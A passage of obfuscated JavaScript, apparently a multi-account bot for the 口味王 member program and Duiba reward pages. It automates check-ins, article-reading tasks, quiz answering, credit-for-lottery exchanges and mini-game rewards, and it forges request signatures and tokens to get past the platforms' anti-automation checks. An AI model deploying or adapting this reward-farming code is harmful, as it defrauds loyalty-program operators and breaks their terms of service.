          if (_0x34b39f.value) {
            this.duibaCookieJar.setCookieSync(_0x34b39f, "https://duiba.com.cn");
          }
        }
      }
    });
  }
  async getToken(_0xcf65ec) {
    try {
      let _0x337eca = "https://" + DUIBAURL + "/projectx/" + _0xcf65ec + "/getToken?_t=" + Date.now(),
        _0x3197c2 = {
          headers: {
            Host: DUIBAURL,
            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            Cookie: "",
            "User-Agent": ua,
            "Accept-Language": "zh-cn",
            "Accept-Encoding": "gzip, deflate, br",
            Connection: "keep-alive"
          },
          cookieJar: this.duibaCookieJar
        },
        _0x279b3f = await got.get(_0x337eca, _0x3197c2).json();
      return _0x279b3f?.["data"];
    } catch (_0x57cdd5) {
      console.log(_0x57cdd5);
    }
  }
  async getTokenKey(_0x581459) {
    try {
      let _0x1227ab = "https://" + DUIBAURL + "/projectx/" + _0x581459 + "/getTokenKey?_t=" + Date.now(),
        _0x510cba = {
          headers: {
            Host: DUIBAURL,
            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            Cookie: "",
            "User-Agent": ua,
            "Accept-Language": "zh-cn",
            "Accept-Encoding": "gzip, deflate, br",
            Connection: "keep-alive"
          },
          cookieJar: this.duibaCookieJar
        },
        _0xa92a4f = await got.get(_0x1227ab, _0x510cba).text();
      return _0xa92a4f;
    } catch (_0x5f2339) {
      console.log(_0x5f2339);
    }
  }
  async kwwqd() {
    let _0x220c2f = Date.now(),
      _0x4268d4 = RandomInt(0, 31),
      _0x21818c = kwwSign(_0x220c2f, this.uid, _0x4268d4);
    try {
      let _0x28202c = {
        url: "https://" + KWWURL + "/member/api/submit/?userKeys=v1.0",
        headers: {
          Host: KWWURL,
          Charset: "utf-8",
          "User-Agent": ua,
          "Content-Type": "application/json",
          "user-sign": _0x21818c,
          "user-paramname": "memberId",
          "user-timestamp": _0x220c2f,
          "user-random": _0x4268d4
        },
        body: "{\"pageName\":\"AddSignSvmInfo\",\"formName\":\"addForm\",\"orderNo\":\"7\",\"paramNo\":\"888\",\"cateId\":\"\",\"memberId\":\"" + this.uid + "\",\"memberName\":\"\"}"
      };
      await httpRequest("post", _0x28202c);
      const _0x306c47 = httpResult;
      console.log("\n口味王账号【" + this.index + "】签到：" + _0x306c47.msg);
    } catch (_0x2c5864) {
      console.log(_0x2c5864);
    }
  }
  async kwwsqg() {
    let _0x5d43a2 = Date.now(),
      _0x376b7d = RandomInt(0, 31),
      _0x3d3efc = kwwSign(_0x5d43a2, this.uid, _0x376b7d);
    try {
      let _0x134f4e = {
        url: "https://" + KWWURL + "/member/api/list/?userKeys=v1.0&pageName=activeTaskFlag&formName=editForm&memberId=" + this.uid + "&userCname=1",
        headers: {
          Host: KWWURL,
          Charset: "utf-8",
          "User-Agent": ua,
          "Content-Type": "application/json",
          "user-sign": _0x3d3efc,
          "user-paramname": "memberId",
          "user-timestamp": _0x5d43a2,
          "user-random": _0x376b7d
        }
      };
      await httpRequest("get", _0x134f4e);
      const _0xb04a6 = httpResult;
      console.log("\n口味王账号【" + this.index + "】收青果：" + _0xb04a6.rows[0]);
    } catch (_0x14a894) {
      console.log(_0x14a894);
    }
  }
  async kwwmryd() {
    let _0x5c180e = Date.now(),
      _0x43ed88 = RandomInt(0, 31),
      _0x25f2ae = kwwSign(_0x5c180e, this.uid, _0x43ed88);
    try {
      let _0x14559b = {
        url: "https://" + KWWURL + "/member/api/list/?userKeys=v1.0&pageName=setNewsReadTaskFlag&formName=addForm&memberId=" + this.uid + "&userCname=1&articleTitle=undefined",
        headers: {
          Host: KWWURL,
          Charset: "utf-8",
          "User-Agent": ua,
          "Content-Type": "application/json",
          "user-sign": _0x25f2ae,
          "user-paramname": "memberId",
          "user-timestamp": _0x5c180e,
          "user-random": _0x43ed88
        }
      };
      await httpRequest("get", _0x14559b);
      let _0x5aee5c = httpResult;
      console.log("\n口味王账号【" + this.index + "】每日阅读：" + _0x5aee5c.rows[0]);
    } catch (_0x5baa8d) {
      console.log(_0x5baa8d);
    }
  }
  async IndexHtmlRed(_0x29dab7) {}
  async creditsCostDo(_0x52e9a3, _0x2590f9) {
    let _0x5b307c = Date.now(),
      _0xcc36a3 = "https://" + DUIBAURL + "/projectx/" + _0x52e9a3 + "/credits/creditsCost.do?_t=" + _0x5b307c,
      _0x3e71ce = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "toPlaywayId=game&toActionId=exchange&desc=exchange_consume_credits_desc&credits=880&orderId=" + _0x2590f9 + "&user_type=0&is_from_share=1&_t=" + _0x5b307c,
        cookieJar: this.duibaCookieJar
      },
      _0x3c7b52 = await got.post(_0xcc36a3, _0x3e71ce).json();
    console.log(_0x3c7b52);
    return _0x3c7b52;
  }
  async getExchangeOrderId(_0x48cb60, _0x542c20) {
    let _0x8b31ac = Date.now(),
      _0x593665 = "https://" + DUIBAURL + "/projectx/" + _0x48cb60 + "/game/getExchangeOrderId.do?_t=" + _0x8b31ac,
      _0x41e5da = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "exchangeOneCodeConsumeCredits=880&exchangeCodeCount=1&token=" + _0x542c20 + "&user_type=0&is_from_share=1&_t=" + _0x8b31ac,
        cookieJar: this.duibaCookieJar
      },
      _0x54cf93 = await got.post(_0x593665, _0x41e5da).json();
    console.log(_0x54cf93);
    return _0x54cf93;
  }
  async QueryStatus(_0x46a367, _0x11bb77) {
    let _0x3d33c4 = "https://" + DUIBAURL + "/projectx/" + _0x46a367 + "/credits/queryStatus.do?ticketNum=" + _0x11bb77 + "&user_type=0&is_from_share=1&_t=" + Date.now(),
      _0x276f74 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive"
        },
        cookieJar: this.duibaCookieJar
      },
      _0xf56487 = await got.get(_0x3d33c4, _0x276f74).json();
    console.log(_0xf56487);
    return _0xf56487?.["data"];
  }
  async Index(_0x35f0fe) {
    let _0x33f3c7 = "https://" + DUIBAURL + "/projectx/" + _0x35f0fe + "/game/index.do?kww_user_source=4&kww_user_type=0&user_type=0&is_from_share=1&_t=" + Date.now();
    let _0x23e16c = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x1e903c = await got.get(_0x33f3c7, _0x23e16c).json();
    console.log(_0x1e903c);
    return _0x1e903c?.["data"];
  }
  async Exchange(_0xcf6170, _0x53f63c, _0x5dc41c) {
    let _0x2ad200 = Date.now();
    let _0x4bb2a5 = "https://" + DUIBAURL + "/projectx/" + _0xcf6170 + "/game/exchange.do?_t=" + _0x2ad200,
      _0x1fbbf2 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "ticket=" + _0x53f63c + "&exchangeCodeCount=1&exchangeOneCodeConsumeCredits=880&token=" + _0x5dc41c + "&user_type=0&is_from_share=1&_t=" + _0x2ad200
      },
      _0x2639c4 = await got.post(_0x4bb2a5, _0x1fbbf2).json();
    console.log("exchange.do", _0x2639c4);
    return _0x2639c4;
  }
  async ExchangeInfo(_0x29e3d1) {
    let _0x45830a = "https://" + DUIBAURL + "/projectx/" + _0x29e3d1 + "/game/exchangeInfo.do?user_type=0&is_from_share=1&_t=" + Date.now();
    let _0x5d124c = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x4f3810 = await got.get(_0x45830a, _0x5d124c).json();
    console.log(_0x4f3810);
    return _0x4f3810?.["data"];
  }
  async duibacj(_0x21bb0c) {
    let _0x3a4560 = new Date(),
      _0x10930f = _0x3a4560.getHours(),
      _0x1fb95f = _0x3a4560.getMinutes();
    if (!(_0x10930f < 3 || _0x10930f >= 12 || _0x10930f === 11 && _0x1fb95f > 30)) {
      console.log("未到兑换时间");
      return;
    }
    await this.IndexHtmlRed(_0x21bb0c);
    await $.wait(1000);
    let _0x4c2862 = await this.Index(_0x21bb0c);
    if (_0x4c2862.currentCycleInfo.myCodeList.length > 0) {
      console.log("已经有抽奖码 跳过");
      return;
    }
    let _0x51e01e = await this.getTokenKey(_0x21bb0c),
      _0x3741fd = await this.getToken(_0x21bb0c),
      _0x35e576 = dealToken(_0x3741fd, _0x51e01e),
      _0x31365e = (await this.getExchangeOrderId(_0x21bb0c, _0x35e576)).data.orderId,
      _0x2a271e = await this.creditsCostDo(_0x21bb0c, _0x31365e);
    if (!_0x2a271e?.["success"]) {
      return;
    }
    let _0x7d1a3c = _0x2a271e.data;
    await $.wait(10000);
    let _0x1f7adc = 10,
      _0x248ae8 = 0;
    let _0x10ff56 = await this.QueryStatus(_0x21bb0c, _0x7d1a3c);
    while (_0x10ff56 === 0 && _0x248ae8 < _0x1f7adc) {
      await $.wait(2000);
      _0x10ff56 = await this.QueryStatus(_0x21bb0c, _0x7d1a3c);
      _0x248ae8++;
    }
    await $.wait(1000);
    _0x3741fd = await this.getToken(_0x21bb0c);
    _0x35e576 = dealToken(_0x3741fd, _0x51e01e);
    await this.Exchange(_0x21bb0c, _0x7d1a3c, _0x35e576);
  }
  async IndexHtmlDati(_0x46fae0) {}
  async Start(_0x3ac72f) {
    let _0x251e51 = "https://" + DUIBAURL + "/projectx/" + _0x3ac72f + "/answer/start.do?user_type=0&is_from_share=1&_t=" + Date.now();
    let _0x5cef6a = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x58dc51 = await got.get(_0x251e51, _0x5cef6a).json();
    if (!_0x58dc51?.["data"]) {
      console.log(_0x58dc51.message);
    }
    return _0x58dc51?.["data"];
  }
  async GetQuestion(_0x5bca22, _0x405d68) {
    let _0x30e362 = "https://" + DUIBAURL + "/projectx/" + _0x5bca22 + "/answer/getQuestion.do?startId=" + _0x405d68 + "&user_type=0&is_from_share=1&_t=" + Date.now(),
      _0x2d3f67 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x137ffd = await got.get(_0x30e362, _0x2d3f67).json();
    console.log(_0x137ffd.data);
    return _0x137ffd?.["data"];
  }
  async Submit(_0x3beab3, _0xb69f5b, _0x5589e8, _0x22adfd) {
    let _0x52366e = Date.now(),
      _0x1b3e43 = kwwDtSubmitSign(_0xb69f5b, _0x5589e8, _0x52366e, _0x22adfd);
    let _0x9971 = "https://" + DUIBAURL + "/projectx/" + _0x3beab3 + "/answer/submit.do?answer=" + _0x5589e8 + "&startId=" + _0xb69f5b + "&timestamp=" + _0x52366e + "&sign=" + _0x1b3e43 + "&user_type=0&is_from_share=1&_t=" + _0x52366e,
      _0x1ec400 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x35e86e = await got.get(_0x9971, _0x1ec400).json();
    console.log(_0x35e86e);
    return _0x35e86e?.["data"];
  }
  async complete(_0x239d2e, _0x1ff10f) {
    let _0x5e9df1 = "https://" + DUIBAURL + "/projectx/" + _0x239d2e + "/answer/complete.do?startId=" + _0x1ff10f + "&user_type=1&is_from_share=1&_t=" + Date.now();
    let _0x5bdac9 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x2e81fc = await got.get(_0x5e9df1, _0x5bdac9).json();
    console.log(_0x2e81fc);
  }
  async answerPage(_0x53e737) {
    let _0x2f443e = "https://" + DUIBAURL + "/projectx/" + _0x53e737 + "/answer/answerPage.do?user_type=1&is_from_share=1&_t=" + Date.now(),
      _0xe02b92 = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      };
    let _0x5770fb = await got.get(_0x2f443e, _0xe02b92).json();
    console.log(_0x5770fb);
  }
  async CoopFrontVariable(_0x35b2f3) {
    let _0x1aee06 = "https://" + DUIBAURL + "/projectx/" + _0x35b2f3 + "/coop_frontVariable.query?user_type=0&is_from_share=1&_t=" + Date.now(),
      _0x47774a = {
        headers: {
          Host: DUIBAURL,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      };
    let _0x1e0522 = await got.get(_0x1aee06, _0x47774a).json();
    return _0x1e0522?.["data"]?.["salt"];
  }
  async duibadt(_0x2ba380) {
    try {
      await this.IndexHtmlDati(_0x2ba380);
      await $.wait(1000);
      let _0x53d556 = await this.CoopFrontVariable(_0x2ba380),
        _0x588822 = await this.Start(_0x2ba380);
      if (_0x588822) {
        do {
          let _0x1747cc = await this.GetQuestion(_0x2ba380, _0x588822),
            _0x16e5a1;
          if (!(_0x1747cc.id in answerDict)) {
            if (!dtManual) {
              _0x16e5a1 = 2;
            } else {
              console.log("手动答题");
              console.log(_0x1747cc.content);
              for (let _0x4b8748 = 0; _0x4b8748 < _0x1747cc.answerList; _0x4b8748++) {
                console.log(_0x4b8748 + 1 + " " + _0x1747cc.answerList[_0x4b8748]);
              }
              _0x16e5a1 = rlsyn.questionInt("请输入问题答案");
            }
          } else {
            _0x16e5a1 = answerDict[_0x1747cc.id];
          }
          let _0x591c91 = await this.Submit(_0x2ba380, _0x588822, _0x16e5a1, _0x53d556);
          console.log(_0x591c91?.["correct"]);
          _0x591c91 && _0x591c91.correctAnswer && (answerDict[_0x1747cc.id] = _0x591c91.correctAnswer, console.log("更新" + _0x1747cc.id + " 答案" + _0x591c91.correctAnswer));
          if (_0x1747cc.totalIndex == _0x1747cc.currentIndex) {
            break;
          }
        } while (1);
        await this.complete(_0x2ba380, _0x588822);
        await this.answerPage(_0x2ba380);
      }
    } catch (_0x1d9a7d) {
      console.log(_0x1d9a7d);
    }
  }
  async IndexHtmlPlant(_0x3985ec) {}
  async plantIndex(_0x19a371) {
    let _0x19040e = "https://" + DUIBAURL + "/projectx/" + _0x19a371 + "/game/index.do?user_type=0&is_from_share=1&_t=" + Date.now(),
      _0x4360ef = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x19a371 + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x36d313 = await got.get(_0x19040e, _0x4360ef).json();
    console.log(_0x36d313);
    return _0x36d313?.["data"];
  }
  async Sow(_0x4b7d0f, _0x5d1124) {
    let _0x5aba79 = "https://" + DUIBAURL + "/projectx/" + _0x4b7d0f + "/game/sow.do?_t=" + Date.now(),
      _0x414d4d = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x4b7d0f + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "token=" + _0x5d1124 + "&user_type=0&is_from_share=1&_t=" + Date.now()
      },
      _0x25bfd8 = await got.post(_0x5aba79, _0x414d4d).json();
    console.log(_0x25bfd8);
  }
  async ClaimNewReward(_0x276933, _0x8f7f41) {
    let _0x5cea1c = "https://" + DUIBAURL + "/projectx/" + _0x276933 + "/game/claimNewReward.do?_t=" + Date.now();
    let _0x19c92f = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x276933 + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "token=" + _0x8f7f41 + "&user_type=0&is_from_share=1&_t=" + Date.now()
      },
      _0x1b6238 = await got.post(_0x5cea1c, _0x19c92f).json();
    console.log(_0x1b6238);
  }
  async TaskGuide(_0x3d22cd, _0x1c172b) {
    let _0x4c45fc = "https://" + DUIBAURL + "/projectx/" + _0x3d22cd + "/game/taskGuide.do?_t=" + Date.now(),
      _0x58d70a = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x3d22cd + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "token=" + _0x1c172b + "&user_type=0&is_from_share=1&_t=" + Date.now()
      };
    let _0x1d2182 = await got.post(_0x4c45fc, _0x58d70a).json();
    console.log(_0x1d2182);
  }
  async StartTravel(_0x37d5ec, _0xed2de8) {
    let _0x234426 = "https://" + DUIBAURL + "/projectx/" + _0x37d5ec + "/customTask1/startTravel.do?_t=" + Date.now(),
      _0x47d451 = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x37d5ec + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "token=" + _0xed2de8 + "&user_type=0&is_from_share=1&_t=" + Date.now()
      };
    let _0x52789f = await got.post(_0x234426, _0x47d451).json();
    console.log(_0x52789f);
  }
  async CollectCoconutGuide(_0x481766, _0x206828) {
    let _0xa2065a = "https://" + DUIBAURL + "/projectx/" + _0x481766 + "/game/collectCoconutGuide.do?_t=" + Date.now(),
      _0x1ea61c = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x481766 + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "token=" + _0x206828 + "&user_type=0&is_from_share=1&_t=" + Date.now()
      },
      _0x4690a4 = await got.post(_0xa2065a, _0x1ea61c).json();
    console.log(_0x4690a4);
  }
  async CollectCoconut(_0x346ee0, _0xe9a1ca) {
    let _0x59db45 = "https://" + DUIBAURL + "/projectx/" + _0x346ee0 + "/game/collectCoconut.do?_t=" + Date.now(),
      _0x9ce4d2 = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x346ee0 + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "token=" + _0xe9a1ca + "&user_type=0&is_from_share=1&_t=" + Date.now()
      },
      _0x47c36a = await got.post(_0x59db45, _0x9ce4d2).json();
    console.log(_0x47c36a);
  }
  async DoSign(_0x5f40d8, _0x200e39) {
    let _0x219e94 = "https://" + DUIBAURL + "/projectx/" + _0x5f40d8 + "/checkin_1/doSign.do?_t=" + Date.now(),
      _0x142f45 = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x5f40d8 + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "token=" + _0x200e39 + "&user_type=0&is_from_share=1&_t=" + Date.now()
      },
      _0x2a21f4 = await got.post(_0x219e94, _0x142f45).json();
    console.log(_0x2a21f4);
  }
  async UseEnergyBall(_0x5a239a, _0x365658) {
    let _0x5ee472 = "https://" + DUIBAURL + "/projectx/" + _0x5a239a + "/game/useEnergyBall.do?_t=" + Date.now(),
      _0x436f8d = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x5a239a + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "token=" + _0x365658 + "&user_type=0&is_from_share=1&_t=" + Date.now()
      },
      _0x342828 = await got.post(_0x5ee472, _0x436f8d).json();
    console.log(_0x342828);
    return _0x342828;
  }
  async QueryTask(_0x58d821) {
    let _0x9bb273 = "https://" + DUIBAURL + "/projectx/" + _0x58d821 + "/customTask1/queryTasks.do?user_type=0&is_from_share=1&_t=" + Date.now();
    let _0xb83b83 = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x58d821 + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x5c2eaf = await got.get(_0x9bb273, _0xb83b83).json();
    console.log(_0x5c2eaf);
    return _0x5c2eaf?.["data"];
  }
  async finishBrowseInfoTask(_0x2c3e72, _0x1714a4, _0x4f46ee) {
    let _0xb0be55 = "https://" + DUIBAURL + "/projectx/" + _0x2c3e72 + "/customTask1/finishBrowseInfoTask.do?_t=" + Date.now();
    let _0x1342c4 = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x2c3e72 + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "taskCode=" + _0x4f46ee + "&token=" + _0x1714a4 + "&user_type=0&is_from_share=1&_t=" + Date.now()
      },
      _0x490a42 = await got.post(_0xb0be55, _0x1342c4).json();
    console.log(_0x490a42);
  }
  async postCardInfo(_0x31f870) {
    let _0x34fce1 = "https://" + DUIBAURL + "/projectx/" + _0x31f870 + "/postcard/info.do?user_type=1&is_from_share=1&_t=" + Date.now(),
      _0x4a0043 = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x31f870 + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar
      },
      _0x19908b = await got.get(_0x34fce1, _0x4a0043).json();
    return _0x19908b;
  }
  async postCardClaimPrize(_0x39860f, _0xc2671f, _0x3f58e3) {
    let _0x2d9f8e = "https://" + DUIBAURL + "/projectx/" + _0x39860f + "/postcard/claimPrize.do?_t=" + Date.now(),
      _0x139af7 = {
        headers: {
          Host: DUIBAURL,
          Origin: "https://" + DUIBAURL,
          Referer: "https://" + DUIBAURL + "/projectx/" + _0x39860f + "/index.html?appID=89420&from=login&spm=89420.1.1.1",
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Cookie: "",
          "User-Agent": ua,
          "Accept-Language": "zh-cn",
          "Accept-Encoding": "gzip, deflate, br",
          Connection: "keep-alive",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        cookieJar: this.duibaCookieJar,
        body: "num=" + _0xc2671f + "&token=" + _0x3f58e3 + "&user_type=1&is_from_share=1&_t=" + Date.now()
      },
      _0x1ec434 = await got.post(_0x2d9f8e, _0x139af7).json();
    console.log(_0x1ec434);
  }
  async duibaPlant(_0x4e3066) {
    try {
      await this.IndexHtmlPlant(_0x4e3066);
      await $.wait(1000);
      let _0x4127e3 = await this.plantIndex(_0x4e3066),
        _0x2631b1 = await this.getTokenKey(_0x4e3066),
        _0x26e935,
        _0x163a69;
      !_0x4127e3.isTravelling && (_0x26e935 = await this.getToken(_0x4e3066), _0x163a69 = dealToken(_0x26e935, _0x2631b1), await this.StartTravel(_0x4e3066, _0x163a69));
      _0x26e935 = await this.getToken(_0x4e3066);
      _0x163a69 = dealToken(_0x26e935, _0x2631b1);
      await this.DoSign(_0x4e3066, _0x163a69);
      let _0x4fb670 = await this.QueryTask(_0x4e3066);
      for (let _0x103d4c of _0x4fb670.item) {
        if (_0x103d4c.completedSize > 0) {
          continue;
        }
        _0x103d4c.code.indexOf("browse") >= 0 && (_0x26e935 = await this.getToken(_0x4e3066), _0x163a69 = dealToken(_0x26e935, _0x2631b1), await this.finishBrowseInfoTask(_0x4e3066, _0x163a69, _0x103d4c.code));
      }
      _0x4127e3 = await this.plantIndex(_0x4e3066);
      console.log("使用能量球");
